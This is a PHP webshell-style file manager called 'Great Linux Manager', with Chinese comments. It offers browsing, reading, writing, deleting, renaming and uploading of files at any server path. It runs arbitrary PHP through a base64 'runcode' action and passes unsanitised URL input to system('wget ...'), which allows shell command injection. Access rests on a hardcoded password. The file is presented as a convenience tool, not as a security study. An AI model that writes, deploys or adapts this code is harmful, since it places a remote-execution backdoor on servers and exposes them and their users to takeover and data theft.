<?php
error_reporting(0);
header('Access-Control-Allow-Origin: *');
date_default_timezone_set('Asia/Shanghai');
//不能修改服务器其他网站数据，关闭防跨站脚本即可
//拒绝手机访问
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);//全部变成小写字母
if(strpos($agent, 'jssdk') and strpos($agent, 'aweme_')){
$type = 'douyinurl';exit;//这里输出抖音浏览器环境结果
}else if(strpos($agent, 'mqqbrowser')){
$type = 'qqurl';exit;//这里输出手机QQ浏览器结果
}else if(strpos($agent, 'qqbrowser')){
$type = 'qqbrowserurl';exit;//这里输出QQ浏览器结果
}else if(strpos($agent, 'micromessenger')){
$type = 'wxurl';exit;//这里输出微信结果
}else if(strpos($agent, 'iphone') || strpos($agent, 'ipad')){
$type = 'iosurl';exit;//这里输出iOS结果
}else if(strpos($agent, 'android')){
$type = 'androidurl';exit;//这里输出android结果
}else{
//不是手机就跳转到电脑端
}
function pass($pass){
    for ($i = 0; $i < 99; $i++) {
         $pass=md5($pass);
    }
    return $pass;
}
//简易的登录验证
$user="admin";$pass="qwertyuiop";
if(@$_REQUEST['user']==$user and @$_REQUEST['pass']==$pass){
    setcookie("user", pass($user), time()+3600*24);  /* 24 小时过期  */
    setcookie("pass", pass($pass), time()+3600*24);  /* 24 小时过期  */
}else if(@$_COOKIE['user']==pass($user) and @$_COOKIE['pass']==pass($pass)){
    
}else{
    die("拒绝访问");
}
function getDir($path){
//获取指定目录的文件列表
    if(is_dir($path)){
        $arr=array();
        
        $arrs=array();
        $dir =  scandir($path);//读取目录
        foreach ($dir as $value){
            $type=array();
            $sub_path =$path .'/'.$value;//拼接路径
            if($value == '.' || $value == '..'){
                // $arrs[]=$sub_path;
                continue;//跳过上级目录
            }else if(is_dir($sub_path)){
                //文件夹在这里
                $type['path']=$sub_path;
                $type['name']=strrev(explode("/",strrev($sub_path))['0']);
                $arrs[]=$type;
                //getDir($sub_path);
            }else{
                if(count($arr)<10000){
                //文件在这里
                $type['path']=$sub_path;
                $type['name']=strrev(explode("/",strrev($sub_path))['0']);
                $type['type']=strrev(explode(".",strrev($sub_path))['0']);
                $arr[]=$type;
                }else{
                    break;//终止了，再多浏览器要崩溃了
                }
            }
            
            
        }
        $data=array(
                "folder"=>array_filter($arrs),
                "file"=>array_filter($arr)
                );
        unset($arr,$arrs);
        return $data;
    }else{
        die('3');
    }
}
function is_path_true(){
    if(!empty($_REQUEST['path'])){
                $path=$_REQUEST['path'];
                if(file_exists($path)){
                    return $path;
                }else{
                    die(false);
                }
            }else{
                die(false);
            }
}
function deldir($path) {
    if (is_dir($path)) {
        $dirs = scandir($path);
        foreach ($dirs as $dir) {
            if ($dir != '.' && $dir != '..') {
                $sonDir = $path.'/'.$dir;
                if (is_dir($sonDir)) {
                    delDir($sonDir);
                    @rmdir($sonDir);
                } else {
                    @unlink($sonDir);
                }
            }
        }
        return @rmdir($path);
    }else if(is_file($path)){
        return @unlink($path);
    }
}

$scpsh="#!/bin/bash \n function scp_file { \n local file=\$1 \n local passwd=\"xxxxxx\" \n expect -c\" \n spawn scp -r \${file} root@xx.xx.xx.xx:/home \n expect { \n \\\"*assword\\\" {set timeout 300; send \\\"\${passwd}\\r\\\";} \n } \n expect eof\" \n } \n scp_file \"/home/test.txt\" ";

// echo is_path_true();
//处理文件操作
if(!empty($_REQUEST['type'])){
    $type=$_REQUEST['type'];
    switch ($type) {
        case 'getdirs'://获取目录列表
            echo json_encode(getDir(is_path_true()));
            break;
        case 'getfiles':// 获取文件数据
            $data = file_get_contents(is_path_true());
            echo $data ? $data : "\n";
            break;
        case 'filesave':// 更新｜保存文件数据
            // echo file_put_contents(is_path_true(),base64_decode($_REQUEST['data']));
            $fp = fopen(is_path_true(), 'w');
              if(fwrite($fp, base64_decode($_REQUEST['data']))){
                  echo 1;
              }
              fclose($fp);
            break;
        case 'newfile':// 创建文件
            if(!file_exists($_REQUEST['path'])){
                echo file_put_contents($_REQUEST['path'],"\n");
            }
            break;
        case 'filedels':// 删除文件数据
            echo deldir(is_path_true());
            break;
        case 'rename':// 删除文件数据
            echo rename(is_path_true(),$_REQUEST['newname']);
            break;
        case 'newdir':// 
            $path = is_path_true()."/newdir";
            if(!is_dir($path)){
                echo mkdir($path,0777);
            }
            break;
        case 'downurl':
            $url=empty($_REQUEST['url']) ? die : $_REQUEST['url'];
            echo system("wget -c -b -P ".is_path_true()." ".$url);
            break;
        case 'runcode':
            $url=!empty($_REQUEST['data']) ? $_REQUEST['data'] : die("false");

            $path=time().rand(10000,99999).".php";
            
            file_put_contents($path,"<?php\n".base64_decode($url)."\n?>");
            
            include_once($path);
            
            unlink($path);
            break;
        case 'imgview':// img数据
            $path=!empty($_REQUEST['path']) ? $_REQUEST['path'] : die("false");
            header("Content-Type: image/png;text/html; charset=utf-8");
            if(file_exists($path)){
                echo file_get_contents($path);
            }else{die(2);}
            break;
        case 'upload':
            $counts = @count($_FILES['file']['name']);
            //单图上传
            if($counts==1){
                // 允许上传的图片后缀
                $savename = $_FILES["file"]["name"]['0'];
                if($savename){
                    $savepath = $_COOKIE['filepaths']."/".$savename;
                    @chmod($savepath,0777);
                    $data['error'] = 0;
                    $data['data'] = array($savepath); 
                    if(move_uploaded_file($_FILES["file"]["tmp_name"]['0'],$savepath)){
                	echo json_encode($data);
                    }else{
                        $data['error'] = 200;
                        echo json_encode($data);
                    }
                }
            }
            //多图上传
            if($counts>1){
                $data['error'] = 0;
                $data['data'] = array(); 
                for ($i = 0; $i < $counts; $i++) {
                    // 允许上传的图片后缀
                    $savename = $_FILES["file"]["name"][$i];
                    if($savename){
                        $savepath = $_COOKIE['filepaths']."/".$savename; 
                        @chmod($savepath,0777);
                        array_push($data['data'],$savepath);
                        $b=move_uploaded_file($_FILES["file"]["tmp_name"][$i],$savepath);
                    }
                }
                if($b){
                    echo json_encode($data);
                }else{
                    $data['error'] = 200;
                    echo json_encode($data);
                }
            }

            break;
        default:// 条件不成立就躺尸
            
            break;
    }
    exit;
}
// echo $_SERVER['DOCUMENT_ROOT'];
// $data=getDir($_SERVER['DOCUMENT_ROOT']."/file_icon");
// echo "<pre>";print_r($data);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Great Linux Manager</title>
<style>
::-webkit-scrollbar {
    width: 0px;
}

*{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
}
body{
	display: -webkit-flex;
	display: flex;
	flex-flow:row wrap;
	justify-content: space-between;
}
.code{
	background-color: #333;
	width: 70vw;
	height: 92vh;
}
#code{
	padding: 2.5%;
	background-color: #333;
	width: 100%;
	height: 92vh;
	resize: none;
	color: #F8F8F8;
	margin-top: 1%;
	/*overflow-x: overlay;*/
}
.view{
	background-color: #f8f8f8;
	width: 30vw;
	height: 93vh;
	overflow-y:scroll;
}
#view{
	border: 0;
	background-color: #f8f8f8;
	width: 100%;
	height: 93vh;
}
input{outline:none;}
ul li{list-style:none;}
.art li{width:100%;height:50px;line-height:50px;border-bottom:1px dotted #333;}
.art li img{width:25px;height:25px;vertical-align:middle;}

.art li a,.art li span{color:#333;font-size:12px;text-decoration:none;}
.art li a:hover{color:green;}
.art li span{float:right;margin-right:10px;}
.art li span:hover{color:green;}
.address{width:78vw;height:3vh;line-height:3vh;outline:none;border:1px solid #ececec;padding-right:10px;background-color:#fff;}
.re{width:5vw;height:3vh;line-height:3vh;border:1px solid #ececec;font-size:12px;color:#333;background-color:#ececec;}
.re:hover{background-color:green;color:#fff;}
.side{width:100%;height:3vh;margin:0;padding:0;position: fixed;top:3vh;left:0px;}
.sides{width:30vw;height:4vh;margin:0;padding:0;position: fixed;bottom:0vh;left:0px;}
.side .res{width:10vw;height:3vh;line-height:3vh;border:1px solid #ececec;font-size:12px;color:#333;background-color:#ececec;float:left;}
.sides .res{width:10vw;height:4vh;line-height:4vh;border:1px solid #ececec;font-size:12px;color:#333;background-color:#ececec;float:left;}
.side .res:hover,.sides .res:hover{background-color:green;color:#fff;}
#phprun{width:100vw;}
#phpcodes{width:60vw;height:4vh;float:right;background-color:#333;color:green;border:0;padding-left:10px;}
#coderun{width:10vw;height:4vh;float:right;background-color:#333;color:green;border:0;z-index:999}
#coderun:hover{background-color:green;color:#fff;}
#viewimg{position:fixed;right:0px;bottom:4vh;max-height:30vh;max-width:50vw;display:none;z-index:999;}
</style>
</head>
<body>

    <input id="address" class="address" type="text" value="/www/wwwroot" />
    <input class="re" type="button" onclick="getdirs(document.getElementById('address').value)" value="转到&nbsp;➦" />
    <!--<input class="re" type="button" onclick="newfile()" value="📄&nbsp;新建"/>-->
    <!--<input class="re" type="button" onclick="repath()" value="🔙&nbsp;上级"/>-->
    <input class="re" type="button" onclick="downurl()" value="▼&nbsp;远程下载"/>
    <input class="re" type="button" onclick="downpath()" value="⇆&nbsp;迁移目录"/>
    <input class="re" type="button" onclick="filesave()" value="📃&nbsp;保存"/>
    <div class="view">
        
        <div class="side">
            <input class="res" type="button" onclick="repath()" value="🔙&nbsp;返回上级"/>
            <input class="res" type="button" onclick="uploadpath()" value="🗂︎&nbsp;上传目录"/>
            <input class="res" type="button" onclick="upload()" value="📤&nbsp;上传文件"/>  
        </div>
        <div class="sides">
            <input class="res" type="button" onclick="newdir()" value="📁&nbsp;新建文件夹"/>
            <input class="res" type="button" onclick="newfile()" value="📄&nbsp;新建文件"/>
            <input class="res" type="button" onclick="viewhtml()" value="🌏️&nbsp;预览Html"/>  
        </div>
        <br />
		<ul class="art" id="view">
		    <!--<li><img src="/file_icon/folder.png" /><a onclick="getdirs(this.title)" title="path" href="javascript:void(0);" >admin</a></li>-->
		    <!--<li><img src="/file_icon/php.png" /><a onclick="getfiles(this.title)" title="path" href="javascript:void(0);">indexxxxxxxx.php</a><span onclick="filedels(path)">删除</span><span onclick="filerename(path,name)">重命名</span><span onclick="getfiles(path)">修改</span></li>-->
		</ul>
	</div>
	<div class="code">
		<div id="code"></div>
	</div>
	<div id="phprun">
	    <input type="button" id="coderun" value="Run&nbsp;Code" onclick="runcode()"/>
	    <input type="text" id="phpcodes" value="echo time();"/>
	</div>
<form id="formdata" enctype="multipart/form-data">
  <input id="file" type="file" name="file[]" multiple style="display:none;" onchange="uploading()"/>
</form>
<img src="" id="viewimg" onclick="this.style.display='none'"/>
<script src="http://cdn.staticfile.org/ace/1.4.14/ace.min.js"></script>
<script src="http://cdn.staticfile.org/ace/1.4.14/ext-language_tools.js"></script>
<script src="https://cdn.staticfile.org/jquery/3.6.0/jquery.min.js"></script>
<script type="text/html" id="viewhtml">
CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KPHRpdGxlPkhUTUzlnKjnur/ov5DooYw8L3RpdGxlPgo8c3R5bGU+Cip7CgltYXJnaW46IDA7CglwYWRkaW5nOiAwOwoJYm94LXNpemluZzogYm9yZGVyLWJveDsKfQpib2R5ewoJZGlzcGxheTogLXdlYmtpdC1mbGV4OwoJZGlzcGxheTogZmxleDsKCWZsZXgtZmxvdzpyb3cgd3JhcDsKCWp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsKfQouY29kZXsKCWJhY2tncm91bmQtY29sb3I6ICMzMzM7Cgl3aWR0aDogNTAlOwoJaGVpZ2h0OiA5OHZoOwp9CiNjb2RlewoJcGFkZGluZzogMi41JTsKCWJhY2tncm91bmQtY29sb3I6ICMzMzM7Cgl3aWR0aDogMTAwJTsKCWhlaWdodDogOTglOwoJcmVzaXplOiBub25lOwoJY29sb3I6ICNGOEY4Rjg7CgltYXJnaW4tdG9wOiAxJTsKfQoudmlld3sKCWJhY2tncm91bmQtY29sb3I6ICNmOGY4Zjg7Cgl3aWR0aDogNTAlOwoJaGVpZ2h0OiA5OHZoOwp9CiN2aWV3ewoJYm9yZGVyOiAwOwoJYmFja2dyb3VuZC1jb2xvcjogI2Y4ZjhmODsKCXdpZHRoOiAxMDAlOwoJaGVpZ2h0OiA5OHZoOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgk8ZGl2IGNsYXNzPSJjb2RlIj4KCQk8ZGl2IGlkPSJjb2RlIj48L2Rpdj4KCTwvZGl2PgoJPGRpdiBjbGFzcz0idmlldyI+CgkJPGlmcmFtZSBpZD0idmlldyI+PC9pZnJhbWU+Cgk8L2Rpdj4KPHNjcmlwdCBzcmM9Imh0dHA6Ly9jZG4uc3RhdGljZmlsZS5vcmcvYWNlLzEuNC45L2FjZS5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cDovL2Nkbi5zdGF0aWNmaWxlLm9yZy9hY2UvMS40LjkvZXh0LWxhbmd1YWdlX3Rvb2xzLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBpZD0iSHRtbFRlbXBsYXRlIiB0eXBlPSJ0ZXh0L2h0bWwiPltkYXRhXTwvc2NyaXB0Pgo8c2NyaXB0Pgp2YXIgZWRpdG9yPWZhbHNlOwphY2UuY29uZmlnLnNldCgiYmFzZVBhdGgiLCAiaHR0cDovL2Nkbi5zdGF0aWNmaWxlLm9yZy9hY2UvMS40LjkvIik7CmFjZS5yZXF1aXJlKCJhY2UvZXh0L2xhbmd1YWdlX3Rvb2xzIik7CmZ1bmN0aW9uIGFjZWVkaXQobGFuZ3VhZ2UpewogICAgaWYoZWRpdG9yKXsKICAgICAgICBlZGl0b3IuZGVzdHJveSgpOwogICAgICAgIGVkaXRvci5jb250YWluZXIucmVtb3ZlKCk7CiAgICB9CiAgICAKICAgIGVkaXRvciA9IGFjZS5lZGl0KCJjb2RlIik7CiAgICBlZGl0b3Iuc2V0T3B0aW9ucyh7CiAgICAgICAgZW5hYmxlQmFzaWNBdXRvY29tcGxldGlvbjogdHJ1ZSwKICAgICAgICBlbmFibGVTbmlwcGV0czogdHJ1ZSwKICAgICAgICBlbmFibGVMaXZlQXV0b2NvbXBsZXRpb246IHRydWUKICAgIH0pOwogICAgZWRpdG9yLnNlc3Npb24uc2V0VXNlV3JhcE1vZGUodHJ1ZSk7Ly/liIfmjaLoh6rliqjmjaLooYwKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb2RlJykuc3R5bGUuZm9udFNpemU9JzEycHgnOy8v6K6+572u5a2X5L2T5aSn5bCPCiAgICBlZGl0b3Iuc2V0SGlnaGxpZ2h0QWN0aXZlTGluZShmYWxzZSk7Ly/orr7nva7ooYzpq5jkuq7mmL7npLoKICAgIGVkaXRvci5zZXRTaG93UHJpbnRNYXJnaW4oZmFsc2UpOy8v6K6+572u5omT5Y2w6L656Led5Y+v6KeB5oCnCiAgICAvL2VkaXRvci5nZXRTZXNzaW9uKCkuc2V0VXNlV29ya2VyKGZhbHNlKTvlj5bmtojor63oqIDmqKHlvI/nmoTor63ms5Xmo4Dmn6UKICAgIGVkaXRvci5zZXRUaGVtZSgiYWNlL3RoZW1lL21vbm9rYWkiKTsKICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSgiYWNlL21vZGUvIitsYW5ndWFnZSk7CiAgICAvL2VkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSgiYWNlL21vZGUvY3NzIik7CiAgICAvL2VkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSgiYWNlL21vZGUvamF2YXNjcmlwdCIpOwogICAgdmFyIGNvZGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29kZSIpOwogICAgdmFyIHZpZXcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmlldyIpOwogICAgZWRpdG9yLmdldFNlc3Npb24oKS5vbiAoJ2NoYW5nZScsIGZ1bmN0aW9uIChlKSB7CiAgICAgICAgICAgICAgICAgdmlldy5zcmNkb2M9ZWRpdG9yLmdldFZhbHVlICgpOy8v6I635b6X6L6T5YWl5YaF5a65CiAgICAgICAgICAgICAgICAvLyBlZGl0b3Iuc2V0VmFsdWUgKGVkaXRvclZhbHVlKTsvL+iuvue9rui+k+WFpeWGheWuuQogICAgICAgICAgICAgICAgLy8gZWRpdG9yLm1vdmVDdXJzb3JUbyAoMCwgMCk7Ly8g56e75Yqo5YWJ5qCH6Iez56ysIDAg6KGM77yM56ysIDAg5YiXCiAgICAgICAgICAgICAgICAvLyBlZGl0b3IuZXhlY0NvbW1hbmQgKCdmaW5kJyk757yW6L6R5YaF5a655pCc57SiCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfSk7Cn0KYWNlZWRpdCgiaHRtbCIpOwpmdW5jdGlvbiBiYXNlNjQoc3RyLGNvZGUpIHsKaWYoY29kZT09MCl7cmV0dXJuIHdpbmRvdy5idG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChzdHIpKSk7fWVsc2UgaWYoY29kZT09MSl7cmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChlc2NhcGUod2luZG93LmF0b2Ioc3RyKSkpO30KfQp2YXIgaHRtbCA9IGJhc2U2NChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiSHRtbFRlbXBsYXRlIikuaW5uZXJIVE1MLDEpOwplZGl0b3IuaW5zZXJ0KGh0bWwpOwo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cg==
</script>
<script>
var filepath=false;
var editor=false;
ace.config.set("basePath", "http://cdn.staticfile.org/ace/1.4.14/");
ace.require("ace/ext/language_tools");
function aceedit(language){
    if(editor){
        editor.destroy();
        editor.container.remove();
    }
    
    editor = ace.edit("code");
    editor.setOptions({
        enableBasicAutocompletion: true,
        enableSnippets: true,
        enableLiveAutocompletion: true
    });
    editor.session.setUseWrapMode(true);//切换自动换行
    document.getElementById('code').style.fontSize='14px';//设置字体大小
    // editor.setHighlightActiveLine(false);//设置行高亮显示
    editor.setShowPrintMargin(false);//设置打印边距可见性
    //editor.getSession().setUseWorker(false);取消语言模式的语法检查
    editor.setTheme("ace/theme/monokai");
    editor.getSession().setMode("ace/mode/"+language);
    //editor.getSession().setMode("ace/mode/css");
    //editor.getSession().setMode("ace/mode/javascript");
    var code = document.getElementById("code");
    var view = document.getElementById("view");
    // editor.execCommand ('find');//编辑内容搜索
    // editor.execCommand('replace');
    // editor.replaceAll('bar');
    editor.getSession().on ('change', function (e) {
                //  view.innerHTML=editor.getValue ();//获得输入内容
                // editor.setValue (editorValue);//设置输入内容
                // editor.moveCursorTo (0, 0);// 移动光标至第 0 行，第 0 列
                
                
            });
}
aceedit("php");
function setCookie(cname,cvalue,exdays){
    var d = new Date();
    d.setTime(d.getTime()+(exdays*24*60*60*1000));
    var expires = "expires="+d.toGMTString();
    document.cookie = cname+"="+cvalue+"; "+expires;
}
function getCookie(cname){
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name)==0) { return c.substring(name.length,c.length); }
    }
    return "";
}
function getdirs(path){
    path =path.replace('//', '/');
    var str="";
    $.get("?type=getdirs&path="+path,function(data,status){
        if(data){
            data=JSON.parse(data);
            if(data['folder']){
                for(var i=0; i<data['folder'].length; i++){
                    str+='<li><img src="file_icon/folder.png" /><a onclick="getdirs(this.title)" title="'+data['folder'][i]['path']+'" href="javascript:void(0);" >'+data['folder'][i]['name'].slice(0,22)+'</a><span onclick="filedels(\''+data['folder'][i]['path']+'\')">删除</span><span onclick="filerename(\''+data['folder'][i]['path']+'\')">重命名</span></li>';
                }
            }
            if(data['file']){
                for(var i=0; i<data['file'].length; i++){
                    str+='<li><img src="file_icon/'+data['file'][i]['type']+'.png" onerror="this.src=\'file_icon/txt.png\'"/><a onclick="getfiles(this.title)" title="'+data['file'][i]['path']+'" href="javascript:void(0);">'+data['file'][i]['name'].slice(0,22)+'</a><span onclick="filedels(\''+data['file'][i]['path']+'\')">删除</span><span onclick="filerename(\''+data['file'][i]['path']+'\')">重命名</span><span onclick="getfiles(\''+data['file'][i]['path']+'\')">修改</span></li>';
                }
            }
            document.getElementById("view").innerHTML=str;
            document.getElementById("address").value=path;
            setCookie("filepaths",path,365);
        }else{
            alert("目录不存在！");
        }
    });
}
if(getCookie("filepaths")){
    getdirs(getCookie("filepaths"));
}else{
    getdirs('<?php echo $_SERVER['DOCUMENT_ROOT']; ?>');
}

function newfile(){
    var name=prompt("请输入文件名","newfile.php")
  if (name){
        $.get("?type=newfile&path="+document.getElementById("address").value+"/"+name,function(data,status){
            if(data){
                getdirs(document.getElementById("address").value);
            }else{
                alert("文件已存在！"+data);
            }
        });
    }
}
function repath(){
    var repath=document.getElementById("address").value.split("/").length-1;
    repath=document.getElementById("address").value.split("/",repath).join("/").replace('//', '/');
    if(repath){
        getdirs(repath);
    }else{
        getdirs("/");
    }
    filepath=false;
    editor.setValue("");
}
function base64(str,code) {
if(code==0){return window.btoa(unescape(encodeURIComponent(str)));}else if(code==1){return decodeURIComponent(escape(window.atob(str)));}
}

function getfiles(path){
    var type = ["zip", "mp4", "avi", "mov"];
    var type = path.split(".").slice(-1)[0];
    if(type!="zip" && type!="rar" && type!="7z" && type!="gz" && type!="mp4" && type!="avi" && type!="mov" && type!="ts"){
        if (path){
            $.get("?type=getfiles&path="+path,function(data,status){
                if(data){
                    filepath=path;
                    editor.setValue(data);
                    editor.moveCursorTo (0, 0);
                }else{
                    alert("文件不存在！"+data);
                }
            });
        }
    }
    
    if(type=="png" || type=="jpg" || type=="jpeg" || type=="ico" || type=="bmp" || type=="gif" || type=="apng" || type=="svg" || type=="webp"){
        // console.log(type);
        document.getElementById("viewimg").src="?type=imgview&path="+path;
        document.getElementById("viewimg").style.display="block";
        
    }
}
function filesave(){
    if (filepath){
        if(editor.getValue().length>1){
            $.post("?type=filesave&path="+filepath,{data:base64(editor.getValue(),0)},function(data,status){
                if(data){
                    alert("保存成功");
                }else{
                    alert("文件不存在！"+data);
                }
            });
        }
    }
    
}
function filerename(path){
    var newname=path.split("/").length-1;
    newname=path.split("/",newname).join("/");
    var name=prompt("请输入新的文件名","")
    if (name){
        $.get("?type=rename&path="+path+"&newname="+newname+"/"+name,function(data,status){
            if(data){
                getdirs(document.getElementById("address").value);
            }else{
                alert("重命名失败");
            }
        });
    }
}
function filedels(path){
    if (path){
        var r=confirm("确认要删除？");
        if(r){
            $.get("?type=filedels&path="+path,function(data,status){
                if(data){
                    alert("删除成功");
                    getdirs(document.getElementById("address").value);
                }
            });
        }
    }
}
function runcode(){
    var codes = document.getElementById("phpcodes").value;
    console.log(codes)
    if(codes){
        codes = base64(codes,0);
        $.post("?type=runcode",{data:codes},function(data,status){
                if(data){
                    console.log(data);
                }
        });
    }
}
function newdir(){
    var path=document.getElementById("address").value;
    if(path){
            $.get("?type=newdir&path="+path,function(data,status){
                if(data){
                    alert("创建成功");
                    getdirs(document.getElementById("address").value);
                }
            });
        }
}
function downurl(){
    var path=document.getElementById("address").value;
    var url=prompt("请输入远程文件地址","")
    if (url){
        $.get("?type=downurl&path="+path+"&url="+url,function(data,status){
            alert("已提交系统处理，几分钟后刷新即可，请确保PHP没有禁用system函数！");
        });
    }
}
// var html = document.getElementById("").innerHTML;
// editor.insert(html);//插入文本
function upload(){
    document.getElementById("file").click();
}
function uploading(){
    var fdata=document.getElementById("formdata");
    var data = new FormData(fdata);
    $.ajax({ 
    url:"?type=upload", 
        type:"post", 
        data:data, 
        processData:false, 
        contentType:false, 
        xhr: function() { //用以显示上传进度  
            var xhr = $.ajaxSettings.xhr();
            if (xhr.upload) {
                xhr.upload.addEventListener('progress', function(event) {
                    var percent = Math.floor(event.loaded / event.total * 100); //进度值（百分比制）
                    console.log(percent + "%");
                }, false);
            }
            return xhr
        },
        success:function(res){ 
        res=JSON.parse(res);
            if(res.error==0){ 
                // alert("上传成功！"); 
                getdirs(document.getElementById("address").value);
            }else{
                alert("上传失败,请检查目录权限，ERROR："+res.error);
            }
        }
    });
}
function viewhtml(){
    var newview=window.open();
    var str = base64(document.getElementById("viewhtml").innerHTML,1).split("[data]").join(base64(editor.getValue(),0));
    newview.document.write(str);
    console.log(str)
}
function downpath(){
    alert("敬请期待");
}
function uploadpath(){
    alert("敬请期待");
}
document.onkeydown=function(e){    //对整个页面的键盘事件进行监听
    // console.log(e.keyCode);
    var  keyCode = e.keyCode || e.which || e.charCode;
    var  ctrlKey = e.ctrlKey || e.metaKey;
    var  shiftKey=e.shiftKey;
    var  commandKey=e.commandKey;
    // control=17 command=91  s=83  c=67  v=86  h=72
    if(ctrlKey && e.keyCode==83){//解决win保存
        filesave();
        e.preventDefault();
        return false;
    }else if(commandKey && e.keyCode==83){//解决Mac保存
        filesave();
        e.preventDefault();
        return false;
    }else if(ctrlKey && e.keyCode==72){//解决win替换
        editor.execCommand('replace');
        e.preventDefault();
        return false;
    }else if(commandKey && e.keyCode==72){//解决Mac替换
        editor.execCommand('replace');
        e.preventDefault();
        return false;
    }
    // return false;
}
</script>
</body>
</html>